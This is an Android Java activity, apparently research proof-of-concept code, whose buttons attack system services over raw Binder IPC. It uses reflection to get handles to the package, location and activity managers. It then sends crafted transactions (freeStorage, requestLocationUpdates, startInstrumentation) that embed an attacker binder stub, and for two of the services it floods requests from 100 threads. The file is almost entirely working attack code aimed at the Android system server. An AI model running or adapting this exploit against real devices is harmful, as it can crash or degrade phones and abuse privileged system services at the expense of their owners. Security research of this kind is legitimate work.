package com.example.z9.getallpackage;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.hardware.usb.UsbDevice;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.os.UserHandle;
import android.os.WorkSource;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;

public class Main2Activity extends Activity {
    private static int INTERFACE_TRANSACTION = ('_' << 24) | ('N' << 16) | ('T' << 8) | 'F';
    String tag = "BINDERTEST";
    int MAX = 100;

    TextView tv;
    String packageName = "com.hikame.testbinderserver";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main2);
        tv = (TextView) findViewById(R.id.tv);
        Log.e("proyx",getIntent().getData().getHost());

        Button pms = (Button) findViewById(R.id.pms);
        pms.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View v) {
                try {
                    Target.v = Target.PMS;
                    attackPMS();
                } catch (Exception e) {
                    e.printStackTrace();
                    Log.d(tag, e.toString());
                }
            }

            private void attackPMS() throws Exception {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();

                IBinder ib = getTargetIBinder("package");
                String in = getInterfaceName(ib);
                int code = getCODE(in, "TRANSACTION_freeStorage");
                data.writeInterfaceToken(in);
                data.writeLong(1);
                data.writeInt(1);
                data.writeStrongBinder(new AttackerBinderStub().asBinder());
                ib.transact(code, data, reply, 0);
                reply.readException();
                data.recycle();
                reply.recycle();
                Log.d(tag, "Finished the attack! CODE: " + code);
            }
        });

        Button lms = (Button) findViewById(R.id.lms);
        lms.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View v) {
                Target.v = Target.LMS;
                for (int i = 0; i < MAX; i++) {
                    LMSAttackThread t = new LMSAttackThread();
                    t.start();
                }
            }

            private void attackLMS() throws Exception {
                int mQuality = 201;
                long mInterval = 60 * 60 * 1000;   // 60 minutes
                double FASTEST_INTERVAL_FACTOR = 6.0;  // 6x
                long mFastestInterval = (long) (mInterval / FASTEST_INTERVAL_FACTOR);  // 10 minutes
                long mExpireAt = Long.MAX_VALUE;  // no expiry
                int mNumUpdates = Integer.MAX_VALUE;  // no expiry
                float mSmallestDisplacement = 0.0f;    // meters
                WorkSource mWorkSource = null;
                boolean mHideFromAppOps = false; // True if this request shouldn't be counted by AppOps

                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();

                IBinder ib = getTargetIBinder("location");
                String in = getInterfaceName(ib);
                int code = getCODE(in, "TRANSACTION_requestLocationUpdates");
                data.writeInterfaceToken(in);
                data.writeInt(1);    //generate our one request
                data.writeInt(mQuality);
                data.writeLong(mFastestInterval);
                data.writeLong(mInterval);
                data.writeLong(mExpireAt);
                data.writeInt(mNumUpdates);
                data.writeFloat(mSmallestDisplacement);
                data.writeInt(mHideFromAppOps ? 1 : 0);
                data.writeString("gps");
                data.writeParcelable(mWorkSource, 0);


                data.writeStrongBinder(null);    //listener = null
                data.writeInt(1);    //intent is not null
                data.writeStrongBinder(new AttackerBinderStub().asBinder());    //intent.mtarget
                data.writeString(packageName);    //packageName

                ib.transact(code, data, reply, 0);
                reply.readException();
                data.recycle();
                reply.recycle();
                Log.d(tag, "Finished the attack! CODE: " + code);
            }

            class LMSAttackThread extends Thread {
                @Override
                public void run() {
                    try {
                        Log.d(tag, android.os.Process.myTid() + " is started to conduct attack");
                        attackLMS();
                    } catch (Exception e) {
                        e.printStackTrace();
                        Log.d(tag, android.os.Process.myTid() + " - " + e.toString());
                    }
                }
            }
        });

        Button ams = (Button) findViewById(R.id.ams);
        ams.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View v) {
                Target.v = Target.LMS;

                for (int i = 0; i < MAX; i++) {
                    AMSAttackThread t = new AMSAttackThread();
                    t.start();
                }
            }

            class AMSAttackThread extends Thread {
                @Override
                public void run() {
                    try {
                        Log.d(tag, android.os.Process.myTid() + " is started to conduct attack");
                        attackAMS();
                    } catch (Exception e) {
                        e.printStackTrace();
                        Log.d(tag, android.os.Process.myTid() + " - " + e.toString());
                    }
                }
            }

            private void attackAMS() throws Exception {
                IBinder ib = getTargetIBinder("activity");
                String in = getInterfaceName(ib);
                Class cls = Class.forName("android.app.IActivityManager");
                Field field = cls.getDeclaredField("START_INSTRUMENTATION_TRANSACTION");
                field.setAccessible(true);
                int code = field.getInt(null);

                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                data.writeInterfaceToken("android.app.IActivityManager");
                ComponentName cn = new ComponentName("pkg", "cls");
                cn.writeToParcel(data, 0);
//		        data.writeString(null); //className = null
                data.writeString("");    //profileFile = ""
                data.writeInt(0);    //flags = 0
                data.writeBundle(new Bundle());    //arguments = null
                data.writeStrongBinder(new AttackerBinderStub().asBinder());    //watch = our attacker
                data.writeStrongBinder(null);    //uiAutomationConnection = null
                int uid = android.os.Process.myUid();
                int userID = uid / 100000;
                data.writeInt(userID);    //userId
                data.writeString("");    //abi = ""
                ib.transact(code, data, reply, 0);
                reply.readException();
                boolean res = reply.readInt() != 0;
                reply.recycle();
                data.recycle();
            }
        });
    }

    private String getInterfaceName(IBinder serHandle) throws RemoteException {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        serHandle.transact(INTERFACE_TRANSACTION, data, reply, 0);
        String interfacename = reply.readString();
        data.recycle();
        reply.recycle();
        return interfacename;
    }

    private int getCODE(String intername, String fieldName) throws Exception {
        Class cls = Class.forName(intername);
        Class clstub = Class.forName(intername + "$Stub");
        Field field = clstub.getDeclaredField(fieldName);//"TRANSACTION_freeStorage"
        field.setAccessible(true);
        return field.getInt(null);
    }

    private IBinder getTargetIBinder(String sername) throws Exception {
        Class smcls = Class.forName("android.os.ServiceManager");
        Method mth = smcls.getMethod("getService", String.class);
        return (IBinder) mth.invoke(null, sername);
    }


}
